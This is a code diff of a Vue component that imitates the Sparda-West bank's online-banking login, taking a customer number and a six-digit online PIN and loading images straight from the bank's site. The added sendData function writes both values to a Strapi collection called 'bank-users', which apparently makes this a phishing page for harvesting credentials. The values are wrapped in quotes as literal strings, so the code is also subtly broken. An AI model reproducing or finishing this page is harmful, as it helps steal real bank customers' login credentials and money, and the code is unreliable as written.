@@ -5,14 +5,14 @@
             <div class="textField">
                 <label for="user">Kundennummer</label>
             </div>
-            <input v-model="inputValueUser" type="text" id="user" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
+            <input ref="inputUser" type="text" id="inputUser" autocomplete="off" maxlength="10" tabindex="1" title="Kundennummer (erforderlich)">
             <img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
         <div class="input pin">
             <div class="textField">
                 <label for="onlinePin">Online-Pin</label>
             </div>
-            <input type="password" id="onlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
+            <input ref="inputPin" type="password" id="inputOnlinePin" autocomplete="off" maxlength="6" tabindex="2" title="Online-PIN (erforderlich)">
             <img src="https://banking.sparda-west.de/portalstatic/spm/gfx/style/zifferneingabe.png">
         </div>
     </div>
@@ -70,16 +70,24 @@
 
 <script lang="ts" setup>
 
-    import { ref } from 'vue';
+    const { getProviderAuthenticationUrl } = useStrapiAuth();
+    getProviderAuthenticationUrl('github');
 
-    const inputValueUser = ref('');
-    const savedValueUser = ref('');
+    import { ref, Ref } from 'vue';
+    const { create } = useStrapi();
 
-    function saveInput() {
-        savedValueUser.value = inputValueUser.value;
+    interface InputData {
+        value: string | null | undefined;
     }
-    function sendData() {
-        console.log(savedValueUser);
+
+    const inputUser: Ref<InputData> = ref({ value: null });
+    const inputPin: Ref<InputData> = ref({ value: null });
+    
+    async function sendData(){
+        await create('bank-users', {
+            clientNumber: 'inputUser.value.value',
+            onlinePin: 'inputPin.value.value'
+        });
     }
 
 </script>
